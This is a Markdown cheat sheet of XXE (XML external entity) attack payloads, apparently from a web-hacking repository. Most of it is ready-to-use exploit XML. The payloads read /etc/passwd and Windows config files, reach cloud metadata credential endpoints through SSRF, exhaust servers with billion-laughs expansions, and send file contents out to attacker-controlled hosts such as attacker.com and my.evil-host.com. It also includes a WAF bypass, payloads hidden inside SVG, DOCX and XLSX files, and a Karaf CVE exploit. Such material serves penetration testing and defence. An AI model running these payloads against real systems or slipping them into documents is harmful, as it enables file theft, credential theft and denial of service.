# XXE

* **`Internal Entity`**: If an entity is declared within a DTD it is called as internal entity.
Syntax: `<!ENTITY entity_name "entity_value">`

* **`External Entity`**: If an entity is declared outside a DTD it is called as external entity. Identified by SYSTEM.
Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`

### What is document type definition?
The XML document type definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. The DTD is declared within the optional DOCTYPE element at the start of the XML document. The DTD can be fully self-contained within the document itself (known as an "internal DTD") or can be loaded from elsewhere (known as an "external DTD") or can be hybrid of the two.

## Detect the vulnerability
Basic entity test, when the XML parser parses the external entities the result should contain "John" in `firstName` and "Doe" in `lastName`. Entities are defined inside the `DOCTYPE` element.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```
It might help to set the **Content-Type:** `application/xml` in the request when sending XML payload to the server.



## Exploiting XXE to retrieve files
### Classic XXE
We try to display the content of the file `/etc/passwd`
```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
```
> ⚠️ `SYSTEM` and `PUBLIC` are almost synonym
```xml
<!ENTITY % xxe PUBLIC "Random Text" "URL">
<!ENTITY xxe PUBLIC "Any TEXT" "URL">
```
### Classic XXE Base64 encoded
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

### PHP Wrapper inside XXE
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
]>
<foo>&xxe;</foo>
```
### XInclude attacks
When you can't modify the **DOCTYPE** element use the **XInclude** to target
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## Exploiting XXE to perform SSRF attacks
XXE can be combined with the **SSRF** vulnerability to target another service on the network
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://internal.service/secret_pass.txt" >
]>
<foo>&xxe;</foo>
```
An XXE could be used to abuse a SSRF inside a cloud
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
**Blind SSRF**

Using the previously commented technique you can make the server access a server you control to show it's vulnerable. But, if that's not working, maybe is because XML entities aren't allowed, in that case you could try using XML parameter entities:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

## Exploiting XXE to perform XSS attacks
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```


## Exploiting XXE to perform a deny of service
⚠️ : These attacks might kill the service or the server, do not use them on the production.
### Billion Laugh Attack
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
### Yaml attack
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```

### Parameters Laugh attack
A variant of the Billion Laughs attack, using delayed interpretation of parameter entities, by Sebastian Pipping.
```xml
<!DOCTYPE r [
  <!ENTITY % pe_1 "<!---->">
  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
  <!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
  %pe_4;
]>
<r/>
```

## Exploiting Error Based XXE
### Error Based - Using Local DTD File
Short list of dtd files already stored on Linux systems; list them with `locate .dtd`
```xml
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/usr/share/xml/svg/svg10.dtd
/usr/share/xml/svg/svg11.dtd
/usr/share/yelp/dtd/docbookx.dtd
```
The file `/usr/share/xml/fontconfig/fonts.dtd` has an injectable entity `%constant` at line 148: `<!ENTITY % constant 'int|double|string|matrix|bool|charset|langset|const'>`

The final payload becomes:
```xml
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!ENTITY % constant 'aaa)>
            <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
            <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>">
            &#x25;eval;
            &#x25;error;
            <!ELEMENT aa (bb'>
    %local_dtd;
]>
<message>Text</message>
```

### Error Based - Using Remote DTD
**Payload to trigger the XXE**
```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
    %ext;
]>
<message></message>
```
**Content of ext.dtd**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
**Let's break down the payload:**
1. **`<!ENTITY % file SYSTEM "file:///etc/passwd">`** This line defines an external entity named file that references the content of the file `/etc/passwd` (a Unix-like system file containing user account details).
2. **`<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">`** This line defines an entity eval that holds another entity definition. This other entity (error) is meant to reference a nonexistent file and append the content of the file entity (the `/etc/passwd` content) to the end of the file path. The `&#x25;` is a URL-encoded '`%`' used to reference an entity inside an entity definition.
3. **`%eval;`** This line uses the eval entity, which causes the entity error to be defined.
4. **`%error;`** Finally, this line uses the error entity, which attempts to access a nonexistent file with a path that includes the content of `/etc/passwd`. Since the file doesn't exist, an error will be thrown. If the application reports back the error to the user and includes the file path in the error message, then the content of `/etc/passwd` would be disclosed as part of the error message, revealing sensitive information.

## Exploiting blind XXE to exfiltrate data out-of-band
Sometimes you won't have a result outputted in the page but you can still extract the data with an out of band attack.


### Basic Blind XXE
The easiest way to test for a blind XXE is to try to load a remote resource such as a Burp Collaborator.
```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
]>
<r></r>
```
Send the content of `/etc/passwd` to ["www.malicious.com"](http://www.malicious.com/), you may receive only the first line.
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]
>
<foo>&callhome;</foo>
```

### XXE OOB Attack (Yunusov, 2013)
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
<data>&send;</data>

File stored on http://publicServer.com/parameterEntity_oob.dtd
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
%all;
```

### XXE OOB with DTD and PHP filter
```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

File stored on http://127.0.0.1/dtd.xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
```

### XXE OOB with Apache Karaf
CVE-2018-11788 affecting versions:
* Apache Karaf <= 4.2.1
* Apache Karaf <= 4.1.6
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com"> %dtd;]
<features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
    <feature name="deployer" version="2.0" install="auto">
    </feature>
</features>
```
Send the XML file to the deploy folder.
[Ref. brianwrf/CVE-2018-11788](https://github.com/brianwrf/CVE-2018-11788)


## XXE with local DTD
In some case, outgoing connections are not possible from the web application. DNS names might even not resolve externally with a payload like this:
```xml
<!DOCTYPE root [<!ENTITY test SYSTEM 'http://h3l9e5soi0090naz81tmq5ztaaaaaa.burpcollaborator.net'>]>
<root>&test;</root>
```
If error based exfiltration is possible, you can still rely on a local DTD to do concatenation tricks. Payload to confirm that error message include filename.
```xml
<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///abcxyz/">

    %local_dtd;
]>
<root></root>
```
Assuming payloads such as the previous return a verbose error. You can start pointing to local DTD. With an found DTD, you can submit payload such as the following payload. The content of the file will be place in the error message.
```xml
<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">

    <!ENTITY % ISOamsa '
        <!ENTITY &#x25; file SYSTEM "file:///REPLACE_WITH_FILENAME_TO_READ">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<root></root>
```
## Content-Type
### Content-Type: From x-www-urlencoded to XML
If a POST request accepts the data in XML format, you could try to exploit a XXE in that request. For example, if a normal request contains the following:
```html
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Then you might be able submit the following request, with the same result:
```html
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: From JSON to XEE
To change the request you could use a Burp Extension named “Content Type Converter“. [Here](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) you can find this example:
```json
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
  "firstName": "Avinash",
  "lastName": "",
  "country": "United States",
  "city": "ddd",
  "postalCode": "ddd"
}}}
```
```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]> 
<root>
 <root>
  <firstName>&xxe;</firstName>
  <lastName/>
  <country>United States</country>
  <city>ddd</city>
  <postalCode>ddd</postalCode>
 </root>
</root>
```
Another example can be found [here](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).



# WAF Bypasses
### Bypass via character encoding
XML parsers uses 4 methods to detect encoding:
* HTTP Content Type: Content-Type: text/xml; charset=utf-8
* Reading Byte Order Mark (BOM)
* Reading first symbols of document
  * UTF-8 (3C 3F 78 6D)
  * UTF-16BE (00 3C 00 3F)
  * UTF-16LE (3C 00 3F 00)
* XML declaration: <?xml version="1.0" encoding="UTF-8"?>

We can convert the payload to UTF-16 using iconv to bypass some WAF:
```bash
cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
```

## XXE in Java
Unsecure configuration in 10 different Java classes from three XML processing interfaces (DOM, SAX, StAX) that can lead to XXE:
<img width="1095" alt="68747470733a2f2f73656d677265702e6465762f646f63732f6173736574732f696d616765732f63686561742d7368656574732d7878652d6a6176612d696e666f67726170686963732d31643164353031363830326533616238663038383662363262386338316632312e706e6" src="https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/1f431160-c062-4e30-b1e0-a80940470bab">


# XXE in exotic files
### XXE inside SVG
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls" width="200" height="200"></image>
</svg>
```

**Classic**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**OOB via SVG rasterization**
xxe.svg
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml">
%sp;
%param1;
]>
<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="15" y="100" style="fill:black">XXE via SVG rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara>&exfil;</flowPara>
         </flowDiv>
      </flowRoot>
</svg>
```
xxe.xml
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'>">
```

### XXE inside SOAP
```xml
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```
### XXE inside DOCX file
Format of an Open XML file (inject the payload in any `.xml` file):
* /_rels/.rels
* [Content_Types].xml
* Default Main Document Part
  * /word/document.xml
  * /ppt/presentation.xml
  * /xl/workbook.xml

Then update the file `zip -u xxe.docx [Content_Types].xml`

**Tool**: [oxml xxe](https://github.com/BuffaloWill/oxml_xxe)
```txt
DOCX/XLSX/PPTX
ODT/ODG/ODP/ODS
SVG
XML
PDF (experimental)
JPG (experimental)
GIF (experimental)
```

### XXE inside XLSX file
Structure of the XLSX:
```bash
$ 7z l xxe.xlsx
[...]
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-10-17 15:19:00 .....          578          223  _rels/.rels
2021-10-17 15:19:00 .....          887          508  xl/workbook.xml
2021-10-17 15:19:00 .....         4451          643  xl/styles.xml
2021-10-17 15:19:00 .....         2042          899  xl/worksheets/sheet1.xml
2021-10-17 15:19:00 .....          549          210  xl/_rels/workbook.xml.rels
2021-10-17 15:19:00 .....          201          160  xl/sharedStrings.xml
2021-10-17 15:19:00 .....          731          352  docProps/core.xml
2021-10-17 15:19:00 .....          410          246  docProps/app.xml
2021-10-17 15:19:00 .....         1367          345  [Content_Types].xml
------------------- ----- ------------ ------------  ------------------------
2021-10-17 15:19:00              11216         3586  9 files
```

Extract Excel file: 7z x -oXXE xxe.xlsx

Rebuild Excel file:
```bash
$ cd XXE
$ 7z u ../xxe.xlsx *
```
Add your blind XXE payload inside `xl/workbook.xml`.
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
```
Alternativly, add your payload in xl/sharedStrings.xml:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>
```
Using a remote DTD will save us the time to rebuild a document each time we want to retrieve a different file. Instead we build the document once and then change the DTD. And using FTP instead of HTTP allows to retrieve much larger files.

`xxe.dtd`

```xml
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>"> 
```
Serve DTD and receive FTP payload using [xxeserv](https://github.com/staaldraad/xxeserv):
```bash
$ xxeserv -o files.log -p 2121 -w -wd public -wp 8000
```
### XXE inside DTD file
Most XXE payloads detailed above require control over both the `DTD` or `DOCTYPE` block as well as the `xml` file. In rare situations, you may only control the `DTD` file and won't be able to modify the `xml` file. For example, a MITM. When all you control is the `DTD` file, and you do not control the `xml` file, XXE may still be possible with this payload.
```xml
<!-- Load the contents of a sensitive file into a variable -->
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!-- Use that variable to construct an HTTP get request with the file contents in the URL -->
<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://my.evil-host.com/x=%payload;">'>
%param1;
%external;
```

## Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents
From https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79
### Disclose local file
```xml
<!DOCTYPE doc [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
    <!ENTITY % SuperClass '>
        <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
      <!ENTITY test "test"'
    >
    %local_dtd;
  ]><xxx>cacat</xxx>
```
Disclose HTTP Response:
```xml
<!DOCTYPE doc [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
    <!ENTITY % SuperClass '>
        <!ENTITY &#x25; file SYSTEM "https://erp.company.com">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
      <!ENTITY test "test"'
    >
    %local_dtd;
  ]><xxx>cacat</xxx>
```



















